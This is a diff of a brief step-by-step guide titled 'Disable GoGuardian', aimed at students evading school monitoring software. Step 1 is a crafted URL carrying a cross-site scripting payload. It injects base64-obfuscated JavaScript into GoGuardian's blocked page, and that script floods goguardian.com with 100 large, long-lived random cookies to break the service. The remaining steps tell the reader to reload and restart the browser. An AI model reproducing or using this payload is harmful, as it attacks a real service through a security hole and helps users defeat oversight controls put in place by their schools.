@@ -1,7 +1,7 @@
 Disable GoGuardian
 
 Step 1. Go to https://student.goguardian.com/teacher/blocked.html?cs=[{%22name%22:%20%22%22},%20{%22name%22:%20%22%3Ciframe%20srcdoc=\%22%3Cscript%3Etop.eval(atob(`Zm9yKGxldCBpID0gMDsgaSA8IDEwMDsgaSsrKSB7CiAgZG9jdW1lbnQuY29va2llID0gYHgke2l9PSR7ZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoY3J5cHRvLmdldFJhbmRvbVZhbHVlcyhuZXcgVWludDhBcnJheSgyNSAqIDI1KSkpKX07ZXhwaXJlcz0ke25ldyBEYXRlKDJlMTQpLnRvVVRDU3RyaW5nKCl9O2RvbWFpbj1nb2d1YXJkaWFuLmNvbTtwYXRoPS9gOwp9`))%3C/script%3E\%22%3E%3C/iframe%3E%22}]
-Step 2. Reload the page (If it shows any error page its fine, nothing's broken!!)
-Step 3. Search up chrome://restart
+Step 2. Reload the page (If it shows any error page it's fine, nothing's broken!)
+Step 3. Search up chrome://restart (ON THE SAME SITE)
 
 Some things might still be blocked!
